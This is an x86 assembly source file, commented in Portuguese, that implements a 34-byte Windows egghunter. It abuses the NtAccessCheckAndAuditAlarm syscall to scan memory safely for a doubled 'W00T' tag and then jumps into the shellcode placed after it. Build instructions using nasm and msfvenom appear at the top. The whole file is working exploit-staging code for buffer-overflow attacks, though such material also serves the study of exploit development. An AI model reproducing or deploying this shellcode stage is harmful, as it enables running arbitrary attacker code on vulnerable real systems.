[BITS 32]

; EggHunter usando a função NtAccessCheckAndAuditAlarm
;
; Procedimento de compilação do EggHunter
; nasm egghunter_v5.asm -o egghunter -l egghunter.lst
; cat egghunter | msfvenom -p - -a x86 --platform win -e generic/none -f python
;
; 34 bytes egghunter

_start:
	;mov edx,0x02021717		; Caso desejado descomente/habilite essa linha
							; para que seja definido manualmente o endereço inicial da busca
	jmp loop_check			; salta para a checagem

loop_inc_page:
	or dx,0x0fff			; 

loop_inc_one:
	inc edx 				; atua como um contador
							; incrementa 1 ao valor de EDX

loop_check:					; checa o endereço atual
	push edx 				; coloca (PUSH) EDX na pilha
	push byte +0x2			; coloca 0x2 na pilha 
							; use o 0x02 para NtAccessCheckAndAuditAlarm
                           	; ou use 0x43 para NtDisplayString
	pop eax 				; retira 0x02 ou 0x43 da pilha e o coloca em EAX
							; desta forma este valor é utilizado como parâmetro do syscall
	int 0x2e 				; realiza um System call (para o kernel) usando o registro EAX
	cmp al,0x5 				; checa de ocorreu uma violação de acesso
							; (0xc0000005== ACCESS_VIOLATION) 5
	pop edx					; restaura o edx
	je loop_inc_page		; caso tenho ocorrido uma violação de acesso (erro), salta para 'loop_inc_page'
							; que irá adicionar 4KB a página e continuar a checagem

is_the_egg:
	mov eax,0x57303054		; este é o EGG, ou seja o texto que estamos procurando (W00T)
	mov edi,edx 			; define EDI para nosso endereço de memória
	scasd					; compara EAX com o conteúdo de EDI (que é o conteúdo do EDX)
	jnz loop_inc_one		; checa se são iguais, caso não, salta para loop_inc_one
							; caso sejam simplesmente continua a execução indo para o próximo passo
	scasd					; realiza a checagem do proximo endereçamento de memória EDX + 4, para checar o segundo EGG
	jnz loop_inc_one		; checa se são iguais, caso não, salta para loop_inc_one
							; caso sejam simplesmente continua a execução indo para o próximo passo

matched:
	jmp edi 				; EDI aponta para o início do shellcode
							; realiza um JMP para o shellcode
